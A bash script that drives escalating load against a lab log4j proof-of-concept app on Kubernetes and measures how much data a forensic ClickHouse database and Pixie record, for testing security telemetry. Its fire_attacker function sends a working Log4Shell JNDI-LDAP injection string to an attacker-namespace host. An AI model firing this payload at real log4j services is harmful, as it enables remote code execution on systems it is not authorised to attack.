#!/usr/bin/env bash
# exp_datavolume_extreme.sh — log4j data-volume under escalating load (ExtremeA/B/C),
# AE in PASSTHROUGH (writes EVERYTHING), with a PEM-vs-CH write-integrity check.
#
# Honest scope: this rig is log4j-only (no argocd/react2argo/dx), so A/B/C are
# escalating TRAFFIC levels on the real log4j chain (the variable that actually
# moves the EVERYTHING data-volume). dx-flood semantics (ns-filter off / empty
# SBoBs) affect the FILTER arm's selection, not passthrough volume — noted, not faked.
#
#   A = 1 chain loader   (baseline)
#   B = 5 chain loaders  (moderate)
#   C = 12 chain loaders (extreme) + attacker burst
#
# Per level: forensic_db per-table delta (rows + compressed bytes) over a fixed
# window. Then PEM-vs-CH: px PEM count vs CH count over the run window (write⊇read).
set -uo pipefail
export KUBECONFIG=/tmp/kubeconfig-6a317b76153addf5c58c7c13.yaml
PG=6a317b76153addf5c58c7c13
CLUSTER=547d0a15-4004-435e-aea1-c13e596eb976
CHPOD=chi-forensic-soc-db-soc-cluster-0-0-0
NS=log4j-poc
WIN="${WIN:-150}"
OUT="${OUT:-/tmp/dv_extreme.txt}"
TABLES="http_events dns_events pgsql_events conn_stats"

chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
# per-table active-part rows + compressed bytes (the real on-disk data volume)
snap(){ chq "SELECT table, sum(rows), sum(data_compressed_bytes) FROM system.parts WHERE database='forensic_db' AND active AND table IN ('http_events','dns_events','pgsql_events','conn_stats') GROUP BY table FORMAT TSV"; }
freshness(){ for t in $TABLES; do echo -n "$t max="; chq "SELECT max(event_time) FROM forensic_db.$t"; done; }

FE=$(kubectl -n $NS get svc frontend -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
echo "frontend=$FE win=${WIN}s" | tee "$OUT"

scale_loaders(){ # $1 = desired count
  local want="$1" i
  for i in $(seq 1 12); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wait=false >/dev/null 2>&1; done
  for i in $(seq 1 "$want"); do
    kubectl -n $NS run cl-$i --image=busybox:1.36 --restart=Never -- \
      sh -c "while true; do wget -qO- http://$FE/api/products?q=l$i >/dev/null 2>&1; wget -qO- http://$FE/ >/dev/null 2>&1; sleep 0.2; done" >/dev/null 2>&1
  done
}

fire_attacker(){ kubectl -n attacker-ns exec deploy/attacker -- sh -c 'curl -s -m3 "http://frontend.log4j-poc.svc.cluster.local/api/products?q=\${jndi:ldap://attacker-ns.svc:1389/a}" >/dev/null 2>&1' >/dev/null 2>&1 || true; }

declare -A T0R T0B
run_level(){ # $1=name $2=loaders $3=attacker(0/1)
  local name="$1" n="$2" atk="$3"
  echo "=== LEVEL $name : $n loaders, attacker=$atk ===" | tee -a "$OUT"
  scale_loaders "$n"
  sleep 10  # let loaders attach + chain warm
  local s0; s0=$(date +%s)
  while IFS=$'\t' read -r tb r b; do T0R[$tb]=$r; T0B[$tb]=$b; done < <(snap)
  local end=$((s0+WIN))
  while [[ $(date +%s) -lt $end ]]; do [[ "$atk" == 1 ]] && fire_attacker; sleep 10; done
  local s1; s1=$(date +%s)
  echo "  window ${s0}..${s1} ($((s1-s0))s)" | tee -a "$OUT"
  printf "  %-14s %12s %14s\n" table d_rows d_bytes | tee -a "$OUT"
  while IFS=$'\t' read -r tb r b; do
    local dr=$(( r - ${T0R[$tb]:-0} )) db=$(( b - ${T0B[$tb]:-0} ))
    printf "  %-14s %12d %14d\n" "$tb" "$dr" "$db" | tee -a "$OUT"
  done < <(snap)
  echo "  freshness:" | tee -a "$OUT"; freshness | sed 's/^/    /' | tee -a "$OUT"
}

run_level A 1  0
run_level B 5  1
run_level C 12 1

echo "=== PEM-vs-CH write-integrity (last 5m) ===" | tee -a "$OUT"
labctl ssh $PG -m dev-machine -- 'set -a; . /tmp/pixie-keys.env 2>/dev/null; set +a; export PX_API_KEY="${PX_API_KEY:-$PIXIE_API_KEY}"; px run -f /tmp/pemcount.pxl -c '"$CLUSTER"' 2>&1 | grep -vE "PX_|ENV VARS|^\*|Pixie CLI|Cloud"' </dev/null 2>&1 | tee -a "$OUT"
S5=$(( $(date +%s) - 300 ))
echo "  --- CH last 5m (event_time>=$S5) ---" | tee -a "$OUT"
for t in $TABLES; do echo "  CH $t last5m=$(chq "SELECT count() FROM forensic_db.$t WHERE event_time>=$S5") total=$(chq "SELECT count() FROM forensic_db.$t")" | tee -a "$OUT"; done
echo "DONE -> $OUT" | tee -a "$OUT"
